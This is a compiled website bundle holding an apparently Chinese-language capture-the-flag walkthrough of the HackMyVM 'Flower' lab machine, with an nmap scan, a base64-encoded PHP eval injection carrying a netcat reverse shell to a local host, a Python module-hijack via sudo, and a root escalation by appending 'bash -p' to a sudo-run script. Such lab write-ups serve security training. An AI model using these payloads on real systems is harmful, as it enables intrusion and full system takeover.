"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6636],{7512:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>t});const s=JSON.parse('{"id":"HackMyVm/Machines/Flower","title":"Flower","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/HackMyVm/Machines/Flower.md","sourceDirName":"HackMyVm/Machines","slug":"/HackMyVm/Machines/Flower","permalink":"/docs/HackMyVm/Machines/Flower","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Machines/Flower.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"Connection","permalink":"/docs/HackMyVm/Machines/Connection"},"next":{"title":"Hommie","permalink":"/docs/HackMyVm/Machines/Hommie"}}');var o=r(4848),a=r(8453);const l={},i=void 0,c={},t=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"web\u7aef\u6e17\u900f",id:"web\u7aef\u6e17\u900f",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"user&#39;s flag",id:"users-flag",level:4},{value:"root&#39;s flag",id:"roots-flag",level:4}];function d(e){const n={code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"nmap -sT --min-rate 10000 -p- 192.168.56.114\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"PORT   STATE SERVICE\r\n80/tcp open  http\n"})}),"\n",(0,o.jsx)(n.h3,{id:"web\u7aef\u6e17\u900f",children:"web\u7aef\u6e17\u900f"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013152748128.png",alt:"image-20241013152748128"})}),"\n",(0,o.jsxs)(n.p,{children:["\u4f20\u53c2\u4e3a",(0,o.jsx)(n.code,{children:"MjErMzQ="})]}),"\n",(0,o.jsxs)(n.p,{children:["base64\u89e3\u7801\u662f",(0,o.jsx)(n.code,{children:"21+34"})]}),"\n",(0,o.jsxs)(n.p,{children:["\u731c\u6d4b\u540e\u7aef\u51fd\u6570\u662f",(0,o.jsx)(n.code,{children:"eval"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-php",children:'<?php\r\nif (isset($_POST["petals"])){\r\n\techo eval("return ".base64_decode($_POST["petals"]).";").\' petals \';\r\n}\r\n?>\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'system("nc 192.168.56.101 1234 -e /bin/bash");\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-http",children:"POST / HTTP/1.1\r\nHost: 192.168.56.114\r\nContent-Length: 71\r\nCache-Control: max-age=0\r\nAccept-Language: zh-CN\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://192.168.56.114\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://192.168.56.114/\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\npetals=c3lzdGVtKCJuYyAxOTIuMTY4LjU2LjEwMSAxMjM0IC1lIC9iaW4vYmFzaCIpOw==\n"})}),"\n",(0,o.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@flower:/home/rose/diary$ sudo -l\r\nMatching Defaults entries for www-data on flower:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser www-data may run the following commands on flower:\r\n    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c",(0,o.jsx)(n.code,{children:"/home/rose/diary/diary.py"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@flower:/home/rose/diary$ cat diary.py\r\nimport pickle\r\n\r\ndiary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}\r\np = open(\'diary.pickle\',\'wb\')\r\npickle.dump(diary,p)\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u5199\u5165",(0,o.jsx)(n.code,{children:"pickle.py"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"echo \"import os;os.system('/bin/bash')\" > pickle.py\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py\n"})}),"\n",(0,o.jsx)(n.h4,{id:"users-flag",children:"user's flag"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"rose@flower:~$ cat user.txt \r\nHMV{R0ses_are_R3d$}\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"rose@flower:~$ sudo -l\r\nMatching Defaults entries for rose on flower:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser rose may run the following commands on flower:\r\n    (root) NOPASSWD: /bin/bash /home/rose/.plantbook\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'rose@flower:~$ ls -lah /home/rose/.plantbook\r\n-rwx------ 1 rose rose 128 Oct 13 03:22 /home/rose/.plantbook\r\nrose@flower:~$ echo "bash -p" >> /home/rose/.plantbook\r\nrose@flower:~$ cat /home/rose/.plantbook\r\n#!/bin/bash\r\necho Hello, write the name of the flower that u found\r\nread flower\r\necho Nice, $flower submitted on : $(date)\r\nbash -p\r\nbash -p\r\nrose@flower:~$ sudo -u root /bin/bash /home/rose/.plantbook\r\nHello, write the name of the flower that u found\r\n\r\nNice, submitted on : Sun Oct 13 03:35:43 EDT 2024\n'})}),"\n",(0,o.jsx)(n.h4,{id:"roots-flag",children:"root's flag"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@flower:/home/rose# cat /root/root.txt \r\nHMV{R0ses_are_als0_black.}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>l,x:()=>i});var s=r(6540);const o={},a=s.createContext(o);function l(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:l(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);